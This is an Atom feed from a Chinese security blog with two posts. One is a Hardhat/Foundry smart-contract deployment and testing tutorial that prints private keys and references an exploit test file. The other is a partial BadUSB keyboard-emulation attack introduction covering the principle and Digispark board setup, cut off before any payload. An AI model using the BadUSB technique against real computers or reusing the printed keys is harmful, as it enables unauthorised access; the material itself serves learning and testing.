<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-11-28T11:23:42+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rookie Hacker</title><subtitle>Cyber Security</subtitle><author><name>true</name></author><entry><title type="html">hardhat&amp;amp;foundry</title><link href="http://localhost:4000/2022/11/25/Hardhat.html" rel="alternate" type="text/html" title="hardhat&amp;amp;foundry" /><published>2022-11-25T17:16:00+08:00</published><updated>2022-11-25T17:16:00+08:00</updated><id>http://localhost:4000/2022/11/25/Hardhat</id><content type="html" xml:base="http://localhost:4000/2022/11/25/Hardhat.html"><![CDATA[<h3 id="hardhatfoundry自动化合约部署与测试模拟攻击">hardhat&amp;foundry自动化合约部署与测试，模拟攻击</h3>

<p>[TOC]</p>

<p>thanks by Frank &amp; Deft(beosin security team)</p>

<h4 id="基础环境">基础环境</h4>
<p>当前实验环境<br />
  windows 10<br />
  Node.js 16.14.0<br />
以空文件夹中加入某ERC20示例代币为例，目录结构(contracts不要命名错误)<br />
  testhardhat<br />
    contracts<br />
      ERC20.sol</p>

<h4 id="创建hardhat项目">创建hardhat项目</h4>
<p>位于testhardhat文件下使用Powershell命令初始化</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npm</span> <span class="nx">init</span> <span class="o">-</span><span class="nx">y</span>
</code></pre></div></div>
<p>此时会生成package.json，接下来安装Hardhat，这个过程可能会需要耗费些许时间</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npm</span> <span class="nx">install</span> <span class="nx">hardhat</span>
</code></pre></div></div>
<p>安装结束之后创建项目，官方推荐npx的使用在项目中进行，因为可以根据项目版本进行合理控制。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span>
</code></pre></div></div>
<p>选择Create an empty hardhat.config.js运行后则会在项目目录中创建一个Hardhat配置文件（hardhat.config.js）</p>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/1.png" alt="1" /></p>
  </li>
</ul>

<p>Hardhat项目创建完毕后，可以安装Ethers plugin，为了简化交互</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install @nomiclabs/hardhat-ethers ethers
npm install @nomiclabs/hardhat-waffle
</code></pre></div></div>

<p>为了配置与布局方便，手动添加一个secrets.json文件，用于保存私钥,以ganacha为例，这里配置的是ganache的账户私钥</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
    <span class="dl">"</span><span class="s2">privateKey0</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">c02541627e8811d4038e2aa96dc613fa6ae2372b993da27ddeb3955b948aad21</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">privateKey1</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">3b9dcc325007c1c616b4b06033a9013a599fdaaa7e770e0f656f7d0710436615</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">privateKey2</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">d45e2033d7214c170311872625c8b47d87d699e538cd7c7da9abf83d7b76151b</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div>

<p>接下来就可以修改hardhat.config.js文件,此文件中默认为下面代码，而实际上需要根据情况修改solidity的版本,当前测试代币合约为大于0.5.0</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/** @type import('hardhat/config').HardhatUserConfig */</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">solidity</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0.8.17</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<p>通过require导入插件与私钥配置文件</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Import the Ethers plugin required to interact with the contract</span>
<span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">@nomiclabs/hardhat-ethers</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Key config path</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">privateKey0</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./secrets.json</span><span class="dl">'</span><span class="p">);</span>

<span class="cm">/** @type import('hardhat/config').HardhatUserConfig */</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">solidity</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0.5.17</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<p>接下来是添加配置代码，使用的网络。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">networks</span><span class="p">:{</span>
    <span class="c1">// testnet</span>
    <span class="nl">testnet</span><span class="p">:</span> <span class="p">{</span> <span class="c1">//任意的链网络的rpc地址，</span>
      <span class="na">url</span><span class="p">:</span> <span class="s2">`https://rpc.testnet.fantom.network/`</span><span class="p">,</span>
      <span class="na">chainId</span><span class="p">:</span> <span class="mi">4002</span><span class="p">,</span> <span class="c1">//chainID</span>
      <span class="na">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span> <span class="c1">//私钥配置文件中的私钥0</span>
      <span class="na">gas</span><span class="p">:</span><span class="mi">8000000</span>
    <span class="p">},</span>

    <span class="nx">local_network</span><span class="p">:{</span>
    <span class="nl">url</span><span class="p">:</span> <span class="s2">`HTTP://127.0.0.1:7545`</span><span class="p">,</span>
    <span class="nx">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span>
    <span class="nx">gas</span><span class="p">:</span><span class="mi">6721975000</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>最终代码为</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Import the Ethers plugin required to interact with the contract</span>
<span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">@nomiclabs/hardhat-ethers</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Key config path</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">privateKey0</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./secrets.json</span><span class="dl">'</span><span class="p">);</span>

<span class="cm">/** @type import('hardhat/config').HardhatUserConfig */</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">solidity</span><span class="p">:</span> <span class="p">{</span><span class="na">compilers</span><span class="p">:[{</span><span class="na">version</span><span class="p">:</span><span class="dl">"</span><span class="s2">0.5.17</span><span class="dl">"</span><span class="p">,</span><span class="na">settings</span><span class="p">:{</span>
    <span class="na">optimizer</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">enabled</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
      <span class="na">runs</span><span class="p">:</span> <span class="mi">1000</span>
    <span class="p">}</span>
  <span class="p">}}]},</span>

  <span class="na">networks</span><span class="p">:</span> <span class="p">{</span>
    <span class="c1">// testnet</span>
    <span class="na">testnet</span><span class="p">:</span> <span class="p">{</span> <span class="c1">//任意的链网络的rpc地址，</span>
      <span class="na">url</span><span class="p">:</span> <span class="s2">`https://rpc.testnet.fantom.network/`</span><span class="p">,</span>
      <span class="na">chainId</span><span class="p">:</span> <span class="mi">4002</span><span class="p">,</span> <span class="c1">//chainID</span>
      <span class="na">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span> <span class="c1">//私钥配置文件中的私钥0</span>
      <span class="na">gas</span><span class="p">:</span><span class="mi">8000000</span>
    <span class="p">},</span>
  
    <span class="na">local_network</span><span class="p">:{</span>
    <span class="na">url</span><span class="p">:</span> <span class="s2">`HTTP://127.0.0.1:8545`</span><span class="p">,</span> <span class="c1">//这里配置为默认ganacha地址</span>
    <span class="na">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span>
    <span class="na">gas</span><span class="p">:</span><span class="mi">6721975000</span> <span class="c1">//每笔交易的上限，即默认的gaslimt</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<h4 id="部署代码">部署代码</h4>
<p>上面的代码写好之后，可以先进行编译检查是否有错误，包是否配置完毕。successfully则表示编译完成，会生成artifacts与cache文件夹</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">compile</span>
</code></pre></div></div>

<p>接下来为方便布局使用创建./scripts/deploy.js，以如下代码布局进行合约部署</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">ethers</span>  <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">hardhat</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">privateKey0</span><span class="p">,</span> <span class="nx">privateKey1</span> <span class="p">,</span> <span class="nx">privateKey2</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../secrets.json</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// 全局定义钱包实例</span>
<span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">HTTP://127.0.0.1:8545</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">Provider</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">providers</span><span class="p">.</span><span class="nx">JsonRpcProvider</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">owner</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span><span class="nx">privateKey0</span><span class="p">,</span> <span class="nx">Provider</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">wallet1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span><span class="nx">privateKey1</span><span class="p">,</span> <span class="nx">Provider</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">wallet2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span><span class="nx">privateKey2</span><span class="p">,</span> <span class="nx">Provider</span><span class="p">);</span>

<span class="c1">//部署函数</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">Deploy</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">Deploy Complete !</span><span class="dl">"</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="c1">//模拟主入口</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">(){</span>
    <span class="nx">Deploy</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// try catch for err</span>
<span class="nx">main</span><span class="p">().</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">exitCode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">});</span>
</code></pre></div></div>

<p>目前我们除了在console中打印日志没有对合约进行任何操作，使用下面的命令，指定配置的本地网络进行测试</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npx hardhat run --network local_network scripts/deploy.js
</code></pre></div></div>
<p>如果没有报错则可以看到控制台打印”Deploy Complete !” (如果报const error/Error: could not detect network检查config中网络是否配置错误)</p>

<h4 id="合约交互">合约交互</h4>

<p>部署合约并打印合约地址</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//部署函数</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">Deploy</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">//参数为要部署的合约名称，ERC20中代币主合约命OLPC所以这里使用这个名字。</span>
    <span class="kd">const</span> <span class="nx">OLPC</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="dl">"</span><span class="s2">OLPC</span><span class="dl">"</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">olpc</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">OLPC</span><span class="p">.</span><span class="nx">deploy</span><span class="p">();</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Deploying OPLC...</span><span class="dl">'</span><span class="p">);</span>
    <span class="c1">//等等合约部署完成</span>
    <span class="k">await</span> <span class="nx">olpc</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">OLPC address in:  </span><span class="dl">'</span><span class="p">,</span><span class="nx">olpc</span><span class="p">.</span><span class="nx">address</span><span class="p">)</span>

    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">Deploy Complete !</span><span class="dl">"</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>部署中如果有参数需要填写也可以直接加入参数，比如</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">PancakeRouter</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">pancakeRouter</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">MdexFactory</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="nx">WETH</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
</code></pre></div></div>
<p>也可以调用合约函数，比如获得uniswap部署时的initcodehash</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//部分代码</span>
<span class="kd">const</span> <span class="nx">mdexFactory</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="dl">"</span><span class="s2">MdexFactory</span><span class="dl">"</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">MdexFactory</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">mdexFactory</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">wallet2</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">initCodeHash</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">MdexFactory</span><span class="p">.</span><span class="nx">getInitCodeHash</span><span class="p">();</span>
<span class="p">...</span>
<span class="k">await</span> <span class="nx">MdexFactory</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">wallet2</span><span class="p">).</span><span class="nx">setInitCodeHash</span><span class="p">(</span><span class="nx">initCodeHash</span><span class="p">);</span>
</code></pre></div></div>

<p>如果对于已经部署或者需要初始化的函数则可以直接调用，例如直接调用launchPool初始化</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">poolFactory</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
<span class="k">await</span> <span class="nx">poolFactory</span><span class="p">.</span><span class="nx">launchPool</span><span class="p">(</span>
  <span class="mi">10</span><span class="p">,</span><span class="mi">1669015872</span><span class="p">,</span><span class="mi">1669019472</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">1000000</span><span class="p">,</span>
  <span class="nx">owner</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="nx">bUSD</span><span class="p">.</span><span class="nx">address</span>
<span class="p">);</span>
</code></pre></div></div>

<p>当遇见部署或者调用测试脚本时可能遇见不明确的调试信息，这个时候可以尝试直接使用run或者直接调用脚本不指定网络，可能会给出比较正确的报错信息,例如报错数据类型未指定但 又正确声明后的情况。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">run</span> <span class="c1">// npx hardhat run scripts/deploy.js</span>
</code></pre></div></div>

<h4 id="使用hardhat编写测试脚本">使用hardhat编写测试脚本</h4>
<p>为布局创建并使用 ./test/test.js，实际生产中可能也会由ts编写
需要npm安装chai，这是一个断言库文件，安全完毕后可以简单写一个测试文件对刚刚部署的代币进行测试。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//这是一个断言库</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">expect</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">chai</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">//名称</span>
<span class="nx">describe</span><span class="p">(</span><span class="dl">"</span><span class="s2">OLPC</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">//初始化2个账户地址</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nx">deploy</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="p">[</span><span class="nx">owner</span><span class="p">,</span> <span class="nx">otherAccount</span><span class="p">]</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getSigners</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">OLPC</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="dl">"</span><span class="s2">OLPC</span><span class="dl">"</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">oplc</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">OLPC</span><span class="p">.</span><span class="nx">deploy</span><span class="p">();</span>
        <span class="k">await</span> <span class="nx">oplc</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">owner:  </span><span class="dl">"</span><span class="p">,</span><span class="nx">owner</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
        <span class="c1">//返回合约，owner方便其他函数调用</span>
        <span class="k">return</span><span class="p">{</span> <span class="nx">oplc</span><span class="p">,</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">otherAccount</span><span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">it</span><span class="p">(</span><span class="dl">"</span><span class="s2">Should set the right owner</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="p">{</span> <span class="nx">oplc</span><span class="p">,</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">otherAccount</span> <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">deploy</span><span class="p">();</span>
        <span class="c1">//调用合约中的已有函数</span>
        <span class="kd">const</span> <span class="nx">balance</span> <span class="o">=</span> <span class="nx">oplc</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">owner</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">owner balance: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">balance</span><span class="p">);</span> 
        <span class="c1">//判断预铸到owner账户是否成功</span>
        <span class="nx">expect</span><span class="p">(</span><span class="k">await</span> <span class="nx">balance</span><span class="p">).</span><span class="nx">to</span><span class="p">.</span><span class="nx">equal</span><span class="p">(</span><span class="mi">5130000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span> <span class="o">**</span> <span class="mi">6</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">right!</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>
<p>确保使用的命令为</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">test</span>
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/2.png" alt="2" /></p>
  </li>
</ul>

<h4 id="在合约中使用consolelog获取信息">在合约中使用console.log获取信息</h4>
<p>首先需要在合约中导入文件</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">hardhat/console.sol</span><span class="dl">"</span><span class="p">;</span>
</code></pre></div></div>
<p>接下来在需要使用的函数中加入console.log</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">account</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Sender balance is %s tokens</span><span class="dl">"</span><span class="p">,</span> <span class="nx">_balances</span><span class="p">[</span><span class="nx">account</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nx">_balances</span><span class="p">[</span><span class="nx">account</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/3.png" alt="3" /></p>
  </li>
</ul>

<h4 id="hardhat-fork链状态">hardhat fork链状态</h4>

<p>启动一个Fork主网的Hardhat Network实例，本地测试复杂的交互,需要启动一个节点来完成，官方推荐Alchemy<br />
<a href="https://learnblockchain.cn/docs/hardhat/guides/mainnet-forking.html">https://learnblockchain.cn/docs/hardhat/guides/mainnet-forking.html</a></p>

<p>拉取节点进行测试</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">node</span> <span class="o">--</span><span class="nx">fork</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//eth-mainnet.alchemyapi.io/v2/&lt;key&gt;</span>
</code></pre></div></div>

<p>也可以使用–fork-block-number指定区块</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">node</span> <span class="o">--</span><span class="nx">fork</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//eth-goerli.g.alchemy.com/v2/w-pIbpU...tZuzRC9 --fork-block-number 7974072</span>
</code></pre></div></div>

<p>或者使用配置文件fork某个区块上的网络状态，如果不写区块会默认拉取最新的</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">//fork goerli test 固定写法，内置定义，hardhat testnet loacl_network，不能自定义。</span>
    <span class="nx">hardhat</span><span class="p">:</span> <span class="p">{</span>
      <span class="nl">forking</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://eth-goerli.g.alchemy.com/v2/w-pIbpUV...tZuzRC9</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">blockNumber</span><span class="p">:</span> <span class="mi">7974072</span>
      <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>直接使用命令会默认使用配置的网络，默认会使用8545，需要关闭Ganacha</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">node</span>
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/4.png" alt="4" /></p>
  </li>
</ul>

<p>此时在调用测试脚本时则会使用fork网络</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/5.png" alt="5" /></p>
  </li>
</ul>

<p>在test文件夹下不同的js测试脚本可以指定不同的fork状态，或者重置，params传递空参数则可以禁用</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">network</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">request</span><span class="p">({</span>
  <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">hardhat_reset</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">params</span><span class="p">:</span> <span class="p">[{</span>
    <span class="na">forking</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">jsonRpcUrl</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://eth-mainnet.alchemyapi.io/v2/&lt;key&gt;</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">blockNumber</span><span class="p">:</span> <span class="mi">11095000</span>
    <span class="p">}</span>
  <span class="p">}]</span>
<span class="p">})</span>
</code></pre></div></div>

<h4 id="yarn-相关使用">yarn 相关使用</h4>

<p>(待更新)</p>

<h4 id="hardhat-模拟攻击">hardhat 模拟攻击</h4>

<p>(待更新)</p>

<h4 id="foundry-基本环境">foundry 基本环境</h4>

<p>使用foundry需要foundry环境，并且需要rust支持,跟进此处<a href="https://book.getfoundry.sh/getting-started/installation">instructions</a>按照必要的环境</p>

<p>在控制台安装好之后，在项目中运行，这可能会发花费较长的时间</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cargo install --git https://github.com/foundry-rs/foundry foundry-cli anvil --bins --locked
</code></pre></div></div>

<p>(待更新)</p>

<h4 id="foundry-模拟攻击">foundry 模拟攻击</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge test --contracts ./src/test/MooCAKECTX_exp.sol -vvv
</code></pre></div></div>

<p>(待更新)</p>]]></content><author><name>true</name></author><category term="hardhat" /><summary type="html"><![CDATA[hardhat&amp;foundry自动化合约部署与测试，模拟攻击]]></summary></entry><entry><title type="html">BadUsb HID</title><link href="http://localhost:4000/2022/11/17/BadUsb.html" rel="alternate" type="text/html" title="BadUsb HID" /><published>2022-11-17T11:21:00+08:00</published><updated>2022-11-17T11:21:00+08:00</updated><id>http://localhost:4000/2022/11/17/BadUsb</id><content type="html" xml:base="http://localhost:4000/2022/11/17/BadUsb.html"><![CDATA[<p>author: by Anoxia<br />
check: by yako33</p>

<h4 id="hid原理">HID原理：</h4>
<p>利用HID进行攻击，将USB设备伪装使电脑识别为键盘，利用模拟键盘或者针脚爆破的方式强行攻击，最为常见的方式badusb，或者可以使用其他typec设备对android等设备进行针脚暴力破解等，其中针对badusb有2种制作方向，一种是usb的驱动加载来实现，一种是模拟键盘操作加载来实现，两种方式的目的都是为了突破验证手段。</p>

<h4 id="漏洞产生原因">漏洞产生原因：</h4>
<p>USB设备通常在加载时所要求的权限并不高，行为也很难被识别，所以系统的安全防护软件通常对这类硬件设备的检测力度不够严格，即使在工业生产中所使用的防护设备通常以USB只读的方式运行，但仍然可以通过插入usb设备时的加载文件进行Bypass</p>

<h4 id="前期准备">前期准备：</h4>
<p>准备ATTINY85 Digispark(Attiny85)微型USB开发板(本文中作者使用的设备)，如图：</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/1.png" alt="1" /></p>
  </li>
</ul>

<p>使用该设备需要安装驱动，博主更加推荐的设备为Arduino Leonardo (Atmega32u4)，但价格会更高一些。</p>

<p>同时可以选择的开发板为
Arduino Micro (Atmega32u4)
Chineese Arduino Leonardo clones (Atmega32u4)
Teensy 2.0 (Atmega32u4)
Phoenix Ovipositor (Atmega32u4)</p>

<h4 id="arduino-ide环境配置">arduino ide环境配置：</h4>
<p>打开文件-&gt;首选项，在附加开发板管理器中添加地址：<a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/3.png" alt="3" /></p>
  </li>
</ul>

<p>然后选择开发板管理器，进去后会自动下载索引，如果未下载成功，开启科学上网重新下载</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/4.png" alt="4" /></p>
  </li>
</ul>

<p>然后搜索 “Digistump AVR Boards by Digistump”  进行安装,再在开发板中选择 Digispark（Default-16.5mhz）</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221117badusb/5.png" alt="5" /></p>
  </li>
</ul>

<p>再选择开发板</p>

<ul>
